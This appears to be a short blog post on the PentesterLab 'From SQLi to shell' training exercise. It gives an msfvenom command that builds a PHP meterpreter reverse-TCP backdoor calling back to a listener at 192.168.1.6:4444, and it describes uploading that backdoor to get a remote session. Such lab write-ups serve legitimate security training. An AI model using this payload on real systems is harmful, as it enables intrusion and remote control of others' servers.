---
layout: post
title: From sqli to shell
---


[https://www.pentesterlab.com/exercises/from_sqli_to_shell](https://www.pentesterlab.com/exercises/from_sqli_to_shell)

This is a fun lab which walks through getting admin privileges in a web app through sql injection to upload your own php shell. The shell described is a simple GET request to the PHP cmd function. So lets take it a little further and upload a metasploit php shell.

msfpayload is deprecated so heres the msfvenom for a meterpreter php payload:
{% highlight bash %}
ruby msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.6 LPORT=4444 > exploit.php3
{% endhighlight %}

set up the exploit/multi/handler in msfconsole with the proper payload and upload the php backdoor. Accessing the script will call back to the handler and start a meterpreter session.


